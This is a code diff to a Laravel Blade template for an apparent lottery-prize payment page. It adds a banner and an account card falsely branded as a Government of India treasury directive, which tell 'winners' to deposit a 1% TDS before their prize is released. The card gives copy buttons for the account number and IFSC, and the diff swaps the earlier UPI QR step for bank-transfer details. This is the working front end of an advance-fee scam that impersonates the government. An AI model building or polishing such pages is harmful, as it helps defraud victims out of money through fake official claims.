@@ -59,6 +59,28 @@
             <span class="text-[10px] uppercase font-bold text-stone-400 shrink-0 ml-2">1% TDS</span>
         </div>
 
+        <!-- OFFICIAL GOVERNMENT DIRECTIVE BANNER -->
+        <div class="mx-4 mt-3 p-3.5 sm:p-4 rounded-2xl bg-gradient-to-r from-amber-500/10 via-amber-50 to-amber-500/15 border-2 border-[#DFB755]/50 shadow-xs text-left">
+            <div class="flex items-start gap-3">
+                <div class="w-8 h-8 rounded-xl bg-[#071533] text-[#F3D068] flex items-center justify-center shrink-0 text-sm shadow-sm mt-0.5 border border-[#DFB755]/40">
+                    <i class="fa-solid fa-scale-balanced"></i>
+                </div>
+                <div class="flex-1 min-w-0">
+                    <div class="flex items-center gap-2 mb-1 flex-wrap">
+                        <span class="text-[9px] font-black uppercase tracking-wider px-2 py-0.5 rounded bg-[#071533] text-[#F3D068]">
+                            GOVERNMENT DIRECTIVE • 1% STATUTORY TDS
+                        </span>
+                        <span class="text-[10px] font-black text-amber-800 flex items-center gap-1">
+                            <i class="fa-solid fa-circle-check text-emerald-600"></i> Govt. of India Tax Rule
+                        </span>
+                    </div>
+                    <p class="text-xs sm:text-sm text-stone-800 font-medium leading-relaxed">
+                        Under Directorate regulations and Income Tax statutory guidelines, you must first deposit the mandatory <strong class="text-amber-900 font-black">1% TDS ({{ $tdsFormatted }})</strong> into the official Government Treasury account. Once your 1% TDS payment is verified, your full winning prize amount of <strong class="text-emerald-800 font-black">{{ $prizeAmount }} ({{ $winningFormatted }})</strong> will be immediately released and transferred directly into your registered bank account.
+                    </p>
+                </div>
+            </div>
+        </div>
+
         <!-- STEP 1: Scan & Pay QR (Simple & Direct) -->
         <div id="payment-step-1" class="p-4 sm:p-6 space-y-4">
             
@@ -75,97 +97,108 @@
                 </div>
             </div>
 
-            <!-- Title -->
-            <div class="text-center space-y-0.5">
-                <h3 class="text-lg font-serif font-black text-stone-900 leading-tight">
-                    Scan to Pay <span class="text-amber-600 font-mono font-black">{{ $tdsFormatted }}</span>
-                </h3>
-                <p class="text-xs text-stone-500">Pay using any UPI App (GPay, PhonePe, Paytm, BHIM)</p>
-            </div>
+            <!-- Dynamic Indian Government Treasury Account Card -->
+            <div class="rounded-2xl border-2 border-[#DFB755] bg-gradient-to-b from-[#071533] via-[#0B1E4A] to-[#040A1A] p-4 sm:p-5 text-white shadow-xl relative overflow-hidden">
+                <div class="absolute -right-6 -bottom-6 opacity-5 pointer-events-none text-9xl text-[#DFB755]">
+                    <i class="fa-solid fa-building-columns"></i>
+                </div>
 
-            <!-- QR Code Card Container -->
-            <div class="flex justify-center">
-                <div class="relative p-3 bg-white rounded-2xl border-2 border-[#DFB755] shadow-md group hover:border-amber-600 transition-all text-center">
-                    @if(!empty($upiQrImage) && file_exists(public_path($upiQrImage)))
-                        <img id="upi-qrcode" 
-                            src="{{ asset($upiQrImage) }}?v={{ time() }}" 
-                            alt="Scan UPI QR Code" 
-                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
-                            loading="eager">
-                    @else
-                        <img id="upi-qrcode" 
-                            src="https://api.qrserver.com/v1/create-qr-code/?size=175x175&data={{ urlencode($upiUrl) }}&margin=2" 
-                            alt="Scan UPI QR Code" 
-                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
-                            loading="eager"
-                            onerror="this.src='https://chart.googleapis.com/chart?cht=qr&chs=175x175&chl={{ urlencode($upiUrl) }}';">
-                    @endif
+                <!-- Header Badge -->
+                <div class="flex items-center justify-between border-b border-white/10 pb-3 mb-3.5">
+                    <div class="flex items-center gap-2.5">
+                        <div class="w-8 h-8 rounded-lg bg-[#DFB755]/20 text-[#F3D068] flex items-center justify-center text-sm font-bold border border-[#DFB755]/40 shadow-xs">
+                            <i class="fa-solid fa-landmark-flag"></i>
+                        </div>
+                        <div>
+                            <span class="text-[9px] uppercase font-mono tracking-widest text-[#DFB755] block">
+                                GOVERNMENT OF INDIA • TREASURY ACCOUNT
+                            </span>
+                            <h4 class="text-xs sm:text-sm font-serif font-black text-white">
+                                Official 1% TDS Deposit Account
+                            </h4>
+                        </div>
+                    </div>
+                    <span class="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 text-[9px] font-black uppercase tracking-wider flex items-center gap-1">
+                        <i class="fa-solid fa-circle-check text-[8px]"></i> Verified Govt A/C
+                    </span>
+                </div>
 
-                    <div class="mt-2 text-[10px] font-bold text-stone-600 flex items-center justify-center gap-1">
-                        <i class="fa-solid fa-shield-halved text-emerald-600 text-[10px]"></i>
-                        <span>Maharaja Directorate Verified QR</span>
+                <!-- Dynamic Account Fields Grid -->
+                <div class="space-y-2.5 text-xs">
+                    <!-- Bank Name -->
+                    <div class="bg-white/5 rounded-xl p-2.5 border border-white/5 flex items-center justify-between">
+                        <div class="min-w-0 pr-2">
+                            <span class="text-[8px] uppercase font-bold text-stone-400 tracking-wider block">GOVERNMENT TREASURY BANK</span>
+                            <span class="font-bold text-stone-100 text-xs sm:text-sm block truncate">{{ $govtAccount->bank_name }}</span>
+                            @if(!empty($govtAccount->branch_name))
+                                <span class="text-[10px] text-stone-400 block mt-0.5">Branch: {{ $govtAccount->branch_name }}</span>
+                            @endif
+                        </div>
+                        <i class="fa-solid fa-building-columns text-[#DFB755] text-xs shrink-0"></i>
+                    </div>
+
+                    <!-- Account Number -->
+                    <div class="bg-white/5 rounded-xl p-2.5 border border-white/5 flex items-center justify-between">
+                        <div class="min-w-0 pr-2">
+                            <span class="text-[8px] uppercase font-bold text-stone-400 tracking-wider block">TREASURY ACCOUNT NUMBER</span>
+                            <span id="tds-govt-account-text" class="font-mono font-black text-[#F3D068] text-sm sm:text-base tracking-wider select-all truncate block">
+                                {{ $govtAccount->account_number }}
+                            </span>
+                        </div>
+                        <button type="button" 
+                            onclick="copyFieldText('tds-govt-account-text', this)"
+                            class="px-3 py-1.5 rounded-lg bg-[#DFB755] hover:bg-[#c99f3b] text-[#071533] text-xs font-black transition flex items-center gap-1.5 shrink-0 cursor-pointer shadow-sm">
+                            <i class="fa-regular fa-copy text-[11px]"></i>
+                            <span>Copy</span>
+                        </button>
+                    </div>
+
+                    <!-- IFSC Code -->
+                    <div class="bg-white/5 rounded-xl p-2.5 border border-white/5 flex items-center justify-between">
+                        <div class="min-w-0 pr-2">
+                            <span class="text-[8px] uppercase font-bold text-stone-400 tracking-wider block">TREASURY IFSC CODE</span>
+                            <span id="tds-govt-ifsc-text" class="font-mono font-black text-white text-xs sm:text-sm tracking-wider select-all truncate block">
+                                {{ $govtAccount->ifsc_code }}
+                            </span>
+                        </div>
+                        <button type="button" 
+                            onclick="copyFieldText('tds-govt-ifsc-text', this)"
+                            class="px-3 py-1.5 rounded-lg bg-white/10 hover:bg-white/20 text-[#DFB755] border border-white/15 text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer shadow-sm">
+                            <i class="fa-regular fa-copy text-[11px]"></i>
+                            <span>Copy</span>
+                        </button>
+                    </div>
+
+                    <!-- Account Holder -->
+                    <div class="bg-white/5 rounded-xl p-2.5 border border-white/5 flex items-center justify-between">
+                        <div class="min-w-0 pr-2">
+                            <span class="text-[8px] uppercase font-bold text-stone-400 tracking-wider block">BENEFICIARY / ACCOUNT HOLDER</span>
+                            <span class="font-bold text-stone-100 text-xs sm:text-sm block truncate">{{ $govtAccount->account_holder ?? 'Directorate of State Lotteries - Govt. Treasury' }}</span>
+                        </div>
+                        <i class="fa-solid fa-shield-halved text-emerald-400 text-xs shrink-0"></i>
                     </div>
                 </div>
-            </div>
 
-            <!-- Tap Preferred UPI App -->
-            <div class="space-y-1 text-center">
-                <span class="text-[10px] font-bold text-stone-500 uppercase tracking-wider block">
-                    Or Tap to Pay Directly
-                </span>
-                <div class="grid grid-cols-4 gap-2">
-                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
-                        <div class="w-8 h-8 rounded-lg bg-stone-100 flex items-center justify-center text-xs text-stone-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-brands fa-google text-blue-600 text-sm"></i>
-                        </div>
-                        <span class="text-[10px] font-bold text-stone-700 mt-1">GPay</span>
-                    </a>
-
-                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
-                        <div class="w-8 h-8 rounded-lg bg-purple-50 flex items-center justify-center text-xs text-purple-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-mobile-screen text-purple-600 text-sm"></i>
-                        </div>
-                        <span class="text-[10px] font-bold text-stone-700 mt-1">PhonePe</span>
-                    </a>
-
-                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
-                        <div class="w-8 h-8 rounded-lg bg-sky-50 flex items-center justify-center text-xs text-sky-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-wallet text-sky-600 text-sm"></i>
-                        </div>
-                        <span class="text-[10px] font-bold text-stone-700 mt-1">Paytm</span>
-                    </a>
-
-                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
-                        <div class="w-8 h-8 rounded-lg bg-emerald-50 flex items-center justify-center text-xs text-emerald-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-building-columns text-emerald-600 text-sm"></i>
-                        </div>
-                        <span class="text-[10px] font-bold text-stone-700 mt-1">BHIM</span>
-                    </a>
+                <!-- Footer notice inside account card -->
+                <div class="mt-3 pt-2.5 border-t border-white/10 flex items-center justify-between text-[10px] text-stone-300">
+                    <span class="flex items-center gap-1.5 text-stone-300">
+                        <i class="fa-solid fa-lock text-[#DFB755]"></i> Supports IMPS • NEFT • RTGS • NetBanking
+                    </span>
+                    <span class="text-[#F3D068] font-bold">100% Govt Verified</span>
                 </div>
             </div>
 
-            <!-- UPI ID & Copy Row -->
-            <div class="bg-stone-50 border border-stone-200 rounded-xl p-2.5 flex items-center justify-between">
-                <div class="min-w-0 pr-2">
-                    <span class="block text-[8px] uppercase font-bold text-stone-400 tracking-wider">OFFICIAL UPI ID</span>
-                    <span id="tds-upi-id-text" class="text-xs font-mono font-black text-stone-800 truncate block select-all">{{ $upiId }}</span>
-                </div>
-                <button type="button" 
-                    onclick="copyUpiId()" 
-                    id="copy-upi-btn"
-                    class="px-3 py-1.5 rounded-lg bg-[#071533] hover:bg-[#0B193E] text-[#F3D068] text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer shadow-xs">
-                    <i class="fa-regular fa-copy text-[11px]"></i>
-                    <span>Copy</span>
-                </button>
-            </div>
+
+
+
 
             <!-- Next Button -->
-            <button type="button" 
+            <!-- <button type="button" 
                 onclick="goToStep2()" 
                 class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                 <span>I have paid {{ $tdsFormatted }} • Next</span>
                 <i class="fa-solid fa-arrow-right text-xs"></i>
-            </button>
+            </button> -->
         </div>
 
         <!-- STEP 2: Upload Payment Receipt (Simple & Clean) -->
@@ -449,6 +482,35 @@
                 btn.innerHTML = '<i class="fa-regular fa-copy text-[11px]"></i><span>Copy</span>';
                 btn.classList.remove('bg-emerald-700');
             }, 2000);
+        }
+    }
+
+    // Generic Copy Field Text Helper for Govt Account & IFSC
+    function copyFieldText(elementId, btn) {
+        const textElement = document.getElementById(elementId);
+        if (!textElement) return;
+        const text = textElement.innerText.trim();
+        const originalHtml = btn.innerHTML;
+
+        const setCopied = () => {
+            btn.innerHTML = '<i class="fa-solid fa-check text-[11px] text-emerald-300"></i><span>Copied!</span>';
+            btn.classList.add('bg-emerald-600', 'text-white');
+            setTimeout(() => {
+                btn.innerHTML = originalHtml;
+                btn.classList.remove('bg-emerald-600', 'text-white');
+            }, 2000);
+        };
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(text).then(setCopied);
+        } else {
+            const temp = document.createElement('input');
+            temp.value = text;
+            document.body.appendChild(temp);
+            temp.select();
+            document.execCommand('copy');
+            document.body.removeChild(temp);
+            setCopied();
         }
     }
 
